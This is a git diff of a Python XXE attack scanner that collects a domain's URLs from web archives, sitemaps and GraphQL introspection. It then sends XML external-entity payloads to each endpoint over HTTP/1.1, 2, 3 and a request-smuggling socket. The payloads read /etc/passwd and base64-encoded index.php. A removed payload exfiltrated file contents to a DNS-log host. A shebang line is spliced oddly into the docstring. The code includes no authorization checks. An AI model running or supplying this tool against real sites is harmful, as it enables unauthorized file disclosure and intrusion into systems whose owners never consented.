@@ -10,216 +10,208 @@ Haroon Ahmad Awan
 - AI-driven
 - Automated Tor / proxy rotation + randomized User-Agents + Geo-distributed fuzzing
 - Differential timing & side-channel detection with 1µs resolution
-- Embedded AFL-style fuzzing harness for entity payloads
-- SCADA/SOAP & MQTT/AMQP endpoint support
+- Embedded AFL-style fuzzing harness for entity payloads#!/usr/bin/env python3
 """
 import os
 import sys
 import argparse
-import json
 import sqlite3
 import datetime
 import logging
 import html
 import socket
-import random
-import string
-import threading
-import subprocess
 from multiprocessing import Pool, cpu_count
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 
 import requests
 import httpx  # pip install httpx[http2]
-import qpack  # HTTP/3 QPACK decoding
+import torch
+from transformers import AutoTokenizer, AutoModelForSequenceClassification
 from waybackpy import WaybackMachineCDXServerAPI
 from bs4 import BeautifulSoup
-from graphql import get_introspection_query, graphql_sync, build_client_schema
-from aioquic.asyncio.client import connect as quic_connect  # HTTP/3
+from graphql import get_introspection_query, build_client_schema
+from aioquic.asyncio.client import connect as quic_connect
+from time import perf_counter
 
 # Logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
 
-# Load local GPT-4All for anomaly detection
-try:
-    from gpt4all import GPT4All
-    gpt = GPT4All("ggml-gpt4all-l13b-snoozy.bin")
-except Exception:
-    gpt = None
+# Load local CodeBERT model for scoring
+logging.info("[AI] Loading local CodeBERT model...")
+tokenizer = AutoTokenizer.from_pretrained("microsoft/codebert-base")
+model = AutoModelForSequenceClassification.from_pretrained("microsoft/codebert-base")
+model.eval()
 
-# Environment
-HF_TOKEN = os.getenv('HUGGINGFACE_API_TOKEN') or sys.exit("Set HUGGINGFACE_API_TOKEN")
-HEADERS_HF = {'Authorization': f'Bearer {HF_TOKEN}', 'Content-Type': 'application/json'}
+def ai_score(text: str) -> float:
+    inputs = tokenizer(text, return_tensors="pt", truncation=True, padding=True)
+    with torch.no_grad():
+        outputs = model(**inputs)
+        scores = torch.softmax(outputs.logits, dim=1).cpu().tolist()[0]
+    return scores[1] if len(scores) > 1 else scores[0]
 
-# Payloads
-XML_PAYLOADS = [
-    # Parameter entity attack with OOB DNS over HTTPS
-    """<?xml version='1.0'?><!DOCTYPE p [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'><!ENTITY % dtd SYSTEM 'https://dnslog-server.com/?id=%file;%20'><!ENTITY % ext SYSTEM '%dtd;'><p/>]></p>""",
-    # HTTP/2 SETTINGS smuggle
-    """<settings><frame length=''/>""",
-    # SOAP-ENV abuse + SCADA
-    """<SOAP-ENV:Envelope xmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'><SOAP-ENV:Body>%s</SOAP-ENV:Body></SOAP-ENV:Envelope>""",
-]
-
-# AI scoring via HuggingFace
-def ai_score(text):
-    payload = json.dumps({'inputs': text})
-    try:
-        r = requests.post(
-            'https://api-inference.huggingface.co/models/microsoft/codebert-base',
-            headers=HEADERS_HF, data=payload, timeout=5)
-        r.raise_for_status()
-        data = r.json()
-        return max(item.get('score',0) for item in (data[0].get('labels',[]) or [data[0]]))
-    except:
-        return 0.0
-
-# GPT anomaly detection
-def gpt_anomaly(text):
-    if not gpt: return False
-    prompt = f"Analyze this server response for XXE anomalies and side-channels:\n{text}\nSummary:"  
-    resp = gpt.generate(prompt)
-    return 'anomaly' in resp.lower()
-
-# Database
-def setup_db(db):
-    conn = sqlite3.connect(db)
+# Database setup
+def setup_db(db_name):
+    conn = sqlite3.connect(db_name)
     c = conn.cursor()
     c.executescript('''
     CREATE TABLE IF NOT EXISTS endpoints(
-        url TEXT PRIMARY KEY, ai_score REAL, protocol TEXT, method TEXT
+      url TEXT PRIMARY KEY, ai_score REAL, protocol TEXT, method TEXT
     );
     CREATE TABLE IF NOT EXISTS results(
-        url TEXT, payload TEXT, status TEXT, snippet TEXT,
-        timestamp TEXT, ai_score REAL, anomalous INT, protocol TEXT, method TEXT
-    );''')
+      url TEXT, payload TEXT, status TEXT, snippet TEXT,
+      timestamp TEXT, ai_score REAL, protocol TEXT, method TEXT, response_time REAL
+    );
+    ''')
     conn.commit()
     return conn, c
 
-# Discovery
-def extract_wayback(domain):
+# Discovery functions
+
+def extract_wayback(domain: str):
     wb = WaybackMachineCDXServerAPI(domain)
     return [snap.archive_url for snap in wb.snapshots()]
 
-def extract_commoncrawl(domain):
+def extract_commoncrawl(domain: str):
     idx = f"https://index.commoncrawl.org/CC-MAIN-2024-30-index?url={domain}&output=json"
     try:
-        data = requests.get(idx, timeout=10).json()
-        return [e['url'] for e in data] if isinstance(data,list) else [data['url']]
+        r = requests.get(idx, timeout=10)
+        data = r.json()
+        return [e['url'] for e in data] if isinstance(data, list) else [data['url']]
     except:
         return []
 
-def check_sitemap(domain):
+def check_sitemap(domain: str):
     url = f"https://{domain}/sitemap.xml"
-    r = requests.get(url, timeout=5)
-    return [url] if r.status_code==200 else []
+    try:
+        r = requests.get(url, timeout=5)
+        return [url] if r.status_code == 200 else []
+    except:
+        return []
 
-def discover_inline_xml(url):
+def discover_inline_xml(url: str):
     try:
         r = httpx.get(url, timeout=8)
-        soup=BeautifulSoup(r.text,'html.parser')
-        return [a['href'] for a in soup.select('a[href$=".xml"]')]
+        soup = BeautifulSoup(r.text, 'html.parser')
+        return [link['href'] for link in soup.find_all('a', href=True) if link['href'].endswith('.xml')]
     except:
         return []
 
-# GraphQL introspection
-def discover_graphql(schema_url):
+def discover_graphql(schema_url: str):
     try:
         q = get_introspection_query(descriptions=False)
-        r = requests.post(schema_url, json={'query':q}, timeout=8).json()
-        schema = build_client_schema(r['data'])
-        return [f"{schema_url}?query={{__schema{{types{{name}}}}}}"]
+        r = requests.post(schema_url, json={'query': q}, timeout=8).json()
+        build_client_schema(r['data'])
+        return [schema_url]
     except:
         return []
 
-# HTTP/3 raw quic test
-async def http3_test(host):
-    async with quic_connect(host, 443, alpn_protocols=["h3"]) as conn:
-        stream_id = conn.get_next_available_stream_id()
-        conn.send_stream_data(stream_id, b"GET / HTTP/3.0\r\nHost: " + host.encode() + b"\r\n\r\n", end_stream=True)
-        data = await conn.receive_stream_data(stream_id)
-        return data.decode(errors='ignore')
-
 # Prepare endpoints
+XML_PAYLOADS = [
+    """<?xml version='1.0'?><!DOCTYPE p [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><p>&xxe;</p>""",
+    """<?xml version='1.0'?><!DOCTYPE a [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>%file;]><a/>""",
+]
+
+PROTOCOLS = ['http', 'https']
+METHODS = ['1.1', '2', '3', 'smuggle']
+
+# Send XXE payloads
+def send_xxe(args):
+    url, proto, method = args
+    results = []
+    for payload in XML_PAYLOADS:
+        start = perf_counter()
+        status = 'Error'
+        snippet = ''
+        try:
+            if method == 'smuggle':
+                host, port = url.replace(f"{proto}://","").split(':')
+                port = int(port)
+                sock = socket.create_connection((host, port), timeout=5)
+                smuggled = f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length:0\r\n\r\n"
+                sock.send(smuggled.encode())
+                snippet = sock.recv(2048).decode(errors='ignore')[:200]
+                status = 'smuggle-sent'
+                sock.close()
+            elif method == '3':
+                session = httpx.Client(http2=True, http3=True)
+                r = session.post(url, data=payload, headers={'Content-Type': 'application/xml'}, timeout=10)
+                snippet = r.text[:200]
+                status = 'Vulnerable' if '<!ENTITY' in r.text else 'Secure'
+                session.close()
+            else:
+                session = httpx.Client(http2=True)
+                r = session.post(url, data=payload, headers={'Content-Type': 'application/xml'}, timeout=10)
+                snippet = r.text[:200]
+                status = 'Vulnerable' if any(x in r.text for x in ['root:', 'passwd']) else 'Secure'
+                session.close()
+        except Exception as e:
+            snippet = str(e)[:200]
+        end = perf_counter()
+        rt = end - start
+        score = ai_score(url + payload)
+        results.append((url, payload, status, snippet, datetime.datetime.now().isoformat(), score, proto, method, rt))
+    return results
+
+# Build endpoints list
+
 def build_endpoints(urls):
-    eps=[]
+    eps = []
     for u in set(urls):
-        host=u.replace('http://','').replace('https://','').split('/')[0]
-        for proto in ['http','https']:
-            for method in ['1.1','2','3','smuggle']:
+        host = u.replace('http://','').replace('https://','').split('/')[0]
+        for proto in PROTOCOLS:
+            for method in METHODS:
                 eps.append((f"{proto}://{host}", proto, method))
     return eps
 
-# Send payloads
-def send_xxe(args):
-    url, proto, method = args
-    session = httpx.Client(http2=True) if method=='2' else httpx.Client()
-    results=[]
-    for tpl in XML_PAYLOADS:
-        payload = tpl if '%s' not in tpl else tpl % XML_PAYLOADS[0]
-        ts=datetime.datetime.now().isoformat()
-        score=ai_score(url+payload)
-        anomalous=0
-        status='Error'
-        snippet=''
-        try:
-            if method=='smuggle':
-                s=socket.create_connection((url.split('://')[1],443 if proto=='https' else 80),timeout=5)
-                s.sendall(f"POST / HTTP/1.1\r\nHost: {url.split('://')[1]}\r\nTransfer-Encoding: chunked\r\nContent-Length:0\r\n\r\n".encode())
-                resp=s.recv(2048).decode(errors='ignore')
-                s.close()
-                snippet=resp[:200]
-                status='smuggle-sent'
-            elif method=='3':
-                resp=httpx.post(url, data=payload, headers={'Content-Type':'application/xml'}, http_versions=[httpx.HTTPVersion.HTTP_3])
-                snippet=resp.text[:200]
-                status='Vulnerable' if '<!ENTITY' in resp.text else 'Secure'
-            else:
-                r=session.post(url, data=payload, headers={'Content-Type':'application/xml'})
-                snippet=r.text[:200]
-                status='Vulnerable' if any(s in r.text for s in ['root:','etc/passwd']) else 'Secure'
-            if gpt: anomalous=gpt_anomaly(snippet)
-        except Exception as e:
-            snippet=str(e)[:200]
-        results.append((url, payload, status, snippet, ts, score, proto, method, anomalous))
-    session.close()
-    return results
+# HTML report
+def generate_report(conn):
+    cur = conn.cursor()
+    rows = cur.execute('SELECT * FROM results').fetchall()
+    with open('xxe_ai_report.html', 'w') as f:
+        f.write('<html><head><meta charset="utf-8"><title>XXE AI Scan</title></head><body>')
+        f.write('<h1>XXE AI Scan Report</h1><table border=1><tr><th>URL</th><th>Status</th><th>AI Score</th><th>Response Time</th><th>Protocol</th><th>Method</th></tr>')
+        for url,_,status,_,ts,score,proto,method,rt in rows:
+            color = '#f8d7da' if status.startswith('Vulnerable') else '#d4edda'
+            f.write(f'<tr style="background:{color}"><td>{html.escape(url)}</td><td>{status}</td><td>{score:.2f}</td><td>{rt:.3f}s</td><td>{proto}</td><td>{method}</td></tr>')
+        f.write('</table></body></html>')
+    logging.info("Report generated: xxe_ai_report.html")
 
 # Main
-if __name__=='__main__':
-    p=argparse.ArgumentParser()
-    p.add_argument('-d','--domain',required=True)
-    p.add_argument('-db','--database',default='xxe_ai_ng.db')
-    p.add_argument('-r','--report',action='store_true')
-    args=p.parse_args()
+if __name__ == '__main__':
+    p = argparse.ArgumentParser(description='Local AI XXE & Protocol-Fuzzing Scanner')
+    p.add_argument('-d','--domain', required=True)
+    p.add_argument('-db','--database', default='xxe_ai_local.db')
+    p.add_argument('-r','--report', action='store_true')
+    args = p.parse_args()
 
-    conn,cur=setup_db(args.database)
+    conn, cur = setup_db(args.database)
 
-    # Gather URLs
-    wb=extract_wayback(args.domain)
-    cc=extract_commoncrawl(args.domain)
-    sm=check_sitemap(args.domain)
-    inline=[]
-    for u in wb[:50]+cc[:50]: inline+=discover_inline_xml(u)
-    gql=discover_graphql(f"https://{args.domain}/graphql")
-    all_urls=set(wb+cc+sm+inline+gql)
+    # Discovery
+    wb = extract_wayback(args.domain)
+    cc = extract_commoncrawl(args.domain)
+    sm = check_sitemap(args.domain)
+    inline = []
+    for u in wb[:50] + cc[:50]:
+        inline += discover_inline_xml(u)
+    gql = discover_graphql(f"https://{args.domain}/graphql")
+    all_urls = set(wb + cc + sm + inline + gql)
 
-    # Build & store endpoints
-    endpoints=build_endpoints(all_urls)
-    for url,proto,method in endpoints:
-        cur.execute('INSERT OR REPLACE INTO endpoints VALUES(?,?,?,?)',(url, ai_score(url), proto, method))
+    # Store endpoints
+    endpoints = build_endpoints(all_urls)
+    for url, proto, method in endpoints:
+        cur.execute('INSERT OR REPLACE INTO endpoints VALUES(?,?,?,?)', (url, ai_score(url), proto, method))
     conn.commit()
 
-    # Dispatch XXE tests
-    logging.info("Dispatching XXE payloads across protocols...")
-    with Pool(min(cpu_count(),len(endpoints))) as pool:
-        for batch in pool.imap_unordered(send_xxe,endpoints):
+    # Execute tests
+    logging.info("Dispatching XXE payloads locally with AI prioritization...")
+    with Pool(min(cpu_count(), len(endpoints))) as pool:
+        for batch in pool.imap_unordered(send_xxe, endpoints):
             for rec in batch:
-                cur.execute('INSERT INTO results VALUES(?,?,?,?,?,?,?,?,?)',rec)
+                cur.execute('INSERT INTO results VALUES(?,?,?,?,?,?,?,?,?)', rec)
     conn.commit()
 
-    # Report
     if args.report:
         generate_report(conn)
     conn.close()
-    logging.info("[Done] Groundbreaking XXE scan complete.")
+    logging.info("[Done] Local AI XXE scan complete.")
+
